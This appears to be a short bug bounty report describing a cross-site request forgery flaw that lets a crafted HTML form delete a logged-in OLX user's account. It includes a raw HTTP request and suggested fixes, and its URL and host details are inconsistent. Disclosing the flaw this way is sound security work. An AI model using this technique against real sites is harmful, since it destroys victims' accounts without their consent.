Summary:

Hi Guys

i found a vulnerable endpoint the can deletes any logged in user 

the vulnerable url is 
olx.com/myaccount/delete/

with only one parameter called removehash

___________

POST /account/register/ HTTP/1.1
Host: olx.com.eg
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.

removehash=f4023c8bjgV6Mfulnz00PEJ00ny%2BSo6ga%2BnU7MYC
___________
if you deleted it , request will pass with no errors 

so if a user visits a page containing an HTML FOrm with the above request , user account will be deleted


see this video

FIX
-implement a csrf token
- check referer header before processing any action 
-validate removehash parameter
